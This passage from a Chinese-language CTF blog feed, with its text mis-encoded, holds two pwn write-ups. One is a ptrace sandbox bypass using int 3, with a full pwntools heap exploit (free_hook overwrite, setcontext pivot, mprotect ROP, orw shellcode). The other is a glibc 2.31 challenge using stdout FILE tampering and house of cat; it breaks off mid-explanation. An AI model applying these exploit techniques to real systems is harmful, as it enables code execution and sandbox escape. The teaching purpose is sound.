[<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f5b32c800cd</span> &lt;+<span class="hljs-number">125</span>&gt;:<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f5b32c800cf</span> &lt;+<span class="hljs-number">127</span>&gt;:<span class="hljs-keyword">ret</span>    <br></code></pre></td></tr></table></figure><p>æœ€åˆå¤ç°æ—¶æˆ‘æƒ³åœ¨å †ä¸Šæ‰§è¡ŒROPå°†flagé€šè¿‡orwè¯»å‡ºæ¥ï¼Œä½†æ˜¯æ²™ç›’ç¨‹åºå¥½åƒä¹Ÿç¦ç”¨openä¹‹ç±»çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åçœ‹ç½‘ä¸Šåˆ«çš„å¸ˆå‚…å†™çš„<a href="https://mp.weixin.qq.com/s/LtC68IafiEA6rAF-cAxb0Q">wp</a>æ‰çŸ¥é“éœ€è¦é€šè¿‡<code>int 3</code>è¿™ä¸ªè½¯ä¸­æ–­å»ç»•è¿‡ã€‚</p><h4 id="å…³äºint-3çš„ç»•è¿‡"><a href="#å…³äºint-3çš„ç»•è¿‡" class="headerlink" title="å…³äºint 3çš„ç»•è¿‡"></a>å…³äºint 3çš„ç»•è¿‡</h4><p>å…³äºint 3çš„ç»•è¿‡æˆ‘æ˜¯çœ‹ctftimeä¸Šå…³äºSandyboxçš„wpï¼Œç”±äºæˆ‘è‹±è¯­ä¸å¤ªå¥½åªèƒ½ç†è§£åˆ°è¿™é‡Œäº†ã€‚</p><p>sandboxç¨‹åºforkä¸€ä¸ªå­è¿›ç¨‹ï¼Œé€šè¿‡<strong>ptrace</strong>å‡½æ•°è·Ÿè¸ªå­è¿›ç¨‹ã€‚</p><p>è°ƒç”¨ptrace(PTRACE_SYS, pid, 0, signal)ä½¿å†…æ ¸åœ¨å­è¿›ç¨‹è¿›å…¥å’Œé€€å‡ºç³»ç»Ÿè°ƒç”¨æ—¶éƒ½å°†å…¶æš‚åœã€‚</p><p>sandboxç¨‹åºidaä¸­ä¸»è¦çš„ä¼ªä»£ç ï¼ˆç®€åŒ–ï¼‰ï¼š</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">do&#123;<br><span class="hljs-built_in">if </span>( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) == -1<br>|| waitpid(v4, 0LL, 0) == -1<br>|| ptrace(PTRACE_GETREGS, v4, 0LL, v8) == -1 )<br>    &#123;<br>       break;<br>    &#125;<br>    <br>    <br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    //è¿‡æ»¤ä¸€äº›ç³»ç»Ÿè°ƒç”¨<br>   â€¦â€¦â€¦â€¦â€¦â€¦<br>   <br>   <br>&#125;while ( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) != -1<br>         &amp;&amp; waitpid(v4, 0LL, 0) != -1<br>         &amp;&amp; (v10 != 10000 &amp;&amp; v10 != -1 || ptrace(PTRACE_POKEUSER, v4, 80<span class="hljs-class">LL) != -1) );</span><br></code></pre></td></tr></table></figure><ol><li>å¾ªç¯å¼€å¤´å¤„çš„ ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)ã€waitpid(v4, 0LL, 0)æ˜¯ç­‰å¾…å­è¿›ç¨‹è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼›</li><li>ä¸­é—´çš„ä»£ç å°±æ˜¯è·å–å½“å‰çš„ç³»ç»Ÿè°ƒç”¨å·ï¼ˆraxï¼‰ï¼Œè¿‡æ»¤ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼›</li><li>å¾ªç¯ç»“å°¾å¤„çš„ ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)ã€waitpid(v4, 0LL, 0)æ˜¯ç­‰å¾…å­è¿›ç¨‹ç¦»å¼€ç³»ç»Ÿè°ƒç”¨ã€‚</li></ol><p>ä½¿ç”¨<code>int 3</code>è¿™ä¸ªè½¯ä¸­æ–­åï¼Œå¯ä»¥è®©çˆ¶è¿›ç¨‹å¾ªç¯å¼€å¤´å¤„çš„ ptraceè¯¯ä»¥ä¸ºå­è¿›ç¨‹å·²ç»è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œä½†å®é™…ä¸Šå­è¿›ç¨‹å¹¶æœªè¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼›å½“å­è¿›ç¨‹çœŸæ­£è¿›å…¥ç³»ç»Ÿè°ƒç”¨åï¼Œæ˜¯è§¦å‘å¾ªç¯ç»“å°¾å¤„çš„ ptraceï¼Œ äº‹å®ä¸Šptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)å¹¶ä¸èƒ½åˆ¤æ–­å­è¿›ç¨‹æ˜¯è¿›å…¥ç³»ç»Ÿè°ƒç”¨è¿˜æ˜¯ç¦»å¼€ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™æ ·å°±ç»•è¿‡äº†ä¸­é—´å¯¹ç³»ç»Ÿè°ƒç”¨çš„è¿‡æ»¤ã€‚</p><p>ä½¿ç”¨int 3åï¼š</p><ol><li>å¾ªç¯ç»“å°¾å¤„çš„ ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)ã€waitpid(v4, 0LL, 0)æ˜¯ç­‰å¾…å­è¿›ç¨‹è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼›</li><li>å¾ªç¯å¼€å¤´å¤„çš„ ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)ã€waitpid(v4, 0LL, 0)æ˜¯ç­‰å¾…å­è¿›ç¨‹ç¦»å¼€ç³»ç»Ÿè°ƒç”¨ã€‚</li></ol><p>ç›¸å½“äºåè½¬äº†å¾ªç¯ï¼Œä¹‹åå°±å¯ä»¥é¡ºåˆ©æ‰§è¡Œæ¥ä¸‹æ¥çš„shellcodeäº†ã€‚</p><p>å®Œæ•´çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;sandboxheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>p = process([<span class="hljs-string">&#x27;./sandbox&#x27;</span>,<span class="hljs-string">&#x27;./sandboxheap&#x27;</span>])<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    l = <span class="hljs-built_in">len</span>(pay)<br>    pay = <span class="hljs-built_in">int</span>.from_bytes(pay, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-comment">#print(hex(libcbase))</span><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>syscall_ret = libcbase + <span class="hljs-number">0xd2625</span><br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>pop_rsi = libcbase + <span class="hljs-number">0x23a6a</span><br>pop_rdx = libcbase + <span class="hljs-number">0x1b96</span><br>pop_rax = libcbase + <span class="hljs-number">0x1b500</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x820</span><br><br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x200</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x200</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xa0</span> + p64(heap_addr + <span class="hljs-number">0x1140</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr + <span class="hljs-number">0x1000</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x1350</span>)<br>edit(<span class="hljs-number">4</span>, key(payload))<br><br>shellcode = <span class="hljs-string">&#x27;int 3&#x27;</span> + shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode = asm(shellcode)<br>edit(<span class="hljs-number">5</span>, key(shellcode))<br><br>edit(<span class="hljs-number">3</span>, key(p64(setcontext + <span class="hljs-number">53</span>)))<br>p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>).encode())<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ctftimeä¸Šå…³äºSandyboxçš„wpï¼š<a href="https://ctftime.org/writeup/20115">https://ctftime.org/writeup/20115</a></p><p>å®é™…ä¸Šptraceå‡½æ•°è¿˜æœ‰å…¶å®ƒæ›´å¤šçš„åŠŸèƒ½ï¼Œå…·ä½“è¯·çœ‹ï¼š<a href="https://www.anquanke.com/post/id/231078">https://www.anquanke.com/post/id/231078</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF å…¬å¼€èµ›Week4 pwn è¿™æ˜¯å †ğŸ</title>
    <link href="/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/"/>
    <url>/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF å…¬å¼€èµ›Week4 pwn è¿™æ˜¯å †ğŸ</p><p>é¢˜ç›®ç¯å¢ƒï¼šglibc-2.31</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>é¦–å…ˆçœ‹åˆ°é¢˜ç›®è°ƒç”¨äº†prctlå‡½æ•°ï¼Œè¯´æ˜å¼€äº†æ²™ç›’ä¿æŠ¤æœºåˆ¶ã€‚ä½¿ç”¨seccomp-toolsæ£€æŸ¥ä¸€ä¸‹</p><img src="/img/2/1667357666548.png" style="zoom: 80%;" /><p>å‘ç°é¢˜ç›®ç¦æ­¢äº†execveçš„ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°è¦ç”¨orwå°†flagè¯»å–å‡ºæ¥ï¼›ä½†è¿™é¢˜è¿˜æŠŠopenå‡½æ•°ç»™ç¦ç”¨äº†ï¼ˆæ˜¯ä¸æ˜¯å¾ˆæ— è¯­ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç³»ç»Ÿè°ƒç”¨openatå‡½æ•°å»æ‰“å¼€æ–‡ä»¶ï¼Œopenatå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º257ã€‚ </p><p>â€‹                                                                                                     </p><p>Addå‡½æ•°ç”³è¯·å †å—ï¼ŒDeleå‡½æ•°å’ŒShowå‡½æ•°å°±ä¸€å¥ç®€å•çš„putsè¾“å‡ºã€‚</p><p>å†å»çœ‹çœ‹Editå‡½æ•°ï¼Œå¯¹v1é‡‡ç”¨intç±»å‹å»å®šä¹‰çš„ï¼Œæ²¡æœ‰å¯¹è´Ÿæ•°è¿›è¡Œæ£€æŸ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å»ä¿®æ”¹é™¤å †ä»¥å¤–çš„å…¶å®ƒåœ°æ–¹ã€‚</p><p><img src="/img/2/1667357538953.png"></p><p>è¿›ä¸€æ­¥æŸ¥çœ‹è¿è¡Œæ—¶å…¨å±€å˜é‡heapsåœ¨bssæ®µçš„æ•°æ®ï¼Œå‘ç°å­˜åœ¨IO_FILEçš„åœ°å€ï¼Œå¯ä»¥è¾“å…¥è´Ÿæ•°ç„¶åç›´æ¥ä¿®æ”¹_IO_FILEå½“ä¸­çš„å€¼ã€‚</p><img src="/img/2/1667359698418.jpg" style="zoom: 80%;" /><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>å¯ä»¥ä½¿ç”¨shellcodeå»æ‰§è¡Œorwå°†flagè¯»å–å‡ºæ¥ï¼Œå½“ç„¶å‰ææ˜¯æ³„æ¼å †åœ°å€ï¼Œç„¶åä½¿ç”¨mprotectå‡½æ•°æ›´æ”¹å †åœ°å€çš„æ‰§è¡Œæƒé™ï¼Œç”±äºç¨‹åºæœ€åˆå¹¶æ²¡æœ‰ç»™ç¡®å®šåœ°å€çš„å¯æ‰§è¡Œæ®µï¼Œæ‰€ä»¥éœ€è¦åŠ«æŒrspå¯„å­˜å™¨å…ˆæ‰§è¡Œmprotectå‡½æ•°çš„ROPï¼Œæ‰èƒ½è¿›ä¸€æ­¥å»è°ƒç”¨shellcodeï¼›æˆ–è€…ç›´æ¥åŠ«æŒrspå¯„å­˜å™¨ä½¿ç”¨openã€readã€writeå‡½æ•°çš„ROPæ¥å®ç°orwã€‚è¿™é‡Œæˆ‘é‡‡ç”¨åè€…ã€‚</p><p>ç¨‹åºä¸­çš„gadgetè‚¯å®šæ˜¯ä¸å¤Ÿæˆ‘ä»¬å»å®ç°ROPçš„ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨libcä¸­çš„gadgetã€‚</p><p>è¦æ§åˆ¶rspæ‰å¯ä»¥å»ROPï¼Œlibcä¸­å¯ä»¥å»æ‰§è¡Œsetcontextä¸­çš„ä»£ç æ§åˆ¶rspï¼ˆå…·ä½“è§æˆ‘çš„Dest0g3 520è¿æ–°èµ› pwn ez_kiwiè¿™ç¯‡æ–‡ç« ï¼‰ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å»ä¿®æ”¹_IO_FILEå½“ä¸­çš„å€¼ï¼Œå°±æƒ³åŠæ³•åŠ«æŒå…¶ä¸­çš„æ§åˆ¶æµï¼Œæ¥æ‰§è¡Œsetcontextã€‚</p><h3 id="å…·ä½“è¿‡ç¨‹"><a href="#å…·ä½“è¿‡ç¨‹" class="headerlink" title="å…·ä½“è¿‡ç¨‹"></a>å…·ä½“è¿‡ç¨‹</h3><h5 id="æ³„æ¼libc"><a href="#æ³„æ¼libc" class="headerlink" title="æ³„æ¼libc"></a>æ³„æ¼libc</h5><p>è¿™é‡Œæˆ‘ä»¬å°±å»ä¿®æ”¹æ ‡å‡†è¾“å‡º<code>_IO_2_1_stdout_</code>ä¸­çš„å€¼é¦–å…ˆæ³„æ¼libcçš„åŸºå€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ROPgadget æ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œ<code>syscall ret</code>è¿™ä¸ªgeagetå¯ä»¥ä½¿ç”¨æ“ä½œç å»å¯»æ‰¾ï¼ˆå¦‚ä¸‹ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROPgadget <span class="hljs-attr">--binary</span> libc-<span class="hljs-number">2.31</span><span class="hljs-selector-class">.so</span> <span class="hljs-attr">--opcode</span> <span class="hljs-string">&quot;0f05c3&quot;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜è¦å¯»æ‰¾ï¼š</p><p><code>0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code></p><p>setcontextä¸­åŠ«æŒrspæ˜¯é€šè¿‡rdxæ¥ä¿®æ”¹çš„ï¼Œä½†æ˜¯åœ¨putså‡½æ•°çš„è°ƒç”¨ä¸­æˆ‘ä»¬æ— æ³•å»æ§åˆ¶rdxï¼›ä½¿ç”¨è¿™ä¸ªgadgetï¼ˆå®ƒæ˜¯getkeyserv_handleå‡½æ•°å…¶ä¸­çš„ä¸€æ®µï¼‰ï¼Œä¸ºæˆ‘ä»¬åŠ«æŒæ§åˆ¶æµæä¾›äº†å¾ˆå¥½çš„å¸®åŠ©ã€‚</p><h5 id="æ³„æ¼å †åœ°å€"><a href="#æ³„æ¼å †åœ°å€" class="headerlink" title="æ³„æ¼å †åœ°å€"></a>æ³„æ¼å †åœ°å€</h5><p>å­˜æ”¾gadgetï¼Œå †æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼Œåœ¨libcä¸­mpç»“æ„å°±å­˜æ”¾äº†å †åœ°å€ï¼Œæˆ‘ä»¬å°±é‡‡ç”¨ç›¸åŒçš„æ–¹å¼å»æ³„æ¼å †åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><h5 id="åŠ«æŒæ§åˆ¶æµ"><a href="#åŠ«æŒæ§åˆ¶æµ" class="headerlink" title="åŠ«æŒæ§åˆ¶æµ"></a>åŠ«æŒæ§åˆ¶æµ</h5><p>æ‰§è¡Œputså‡½æ•°ï¼Œä¼šé€šè¿‡æ‰¾åˆ°<code>_IO_2_1_stdout_</code>çš„<code>_IO_file_jumps</code>ä¸­çš„åç§»ï¼Œå»æ‰§è¡Œ<code>_IO_file_xsputn</code>å‡½æ•°ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¿®æ”¹<code>_IO_2_1_stdout_</code>çš„<code>_IO_file_jumps</code>ï¼Œ  è®©å…¶æœ€ç»ˆæ‰§è¡Œå…¶å®ƒå‡½æ•°ã€‚<code>_IO_file_jumps</code> å¹¶ä¸èƒ½æ”¹æˆä»»æ„åœ°å€ï¼Œåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­ä¼šå¯¹å…¶åœ°å€è¿›è¡Œæ£€æŸ¥ã€‚</p><p>è¿™é‡Œæˆ‘é‡‡ç”¨house of cat</p><p>è®©å…¶è°ƒç”¨<code>_IO_wfile_jumps</code>ä¸­çš„<code>_IO_wfile_seekoff</code>å‡½æ•°ï¼Œç„¶åè¿›å…¥åˆ°<code>_IO_switch_to_wget_mode</code>å‡½æ•°å»æ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼ˆç®€å†™ï¼‰ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0xa0</span>]<br><span class="hljs-number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">15</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x20</span>]<br><span class="hljs-number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span 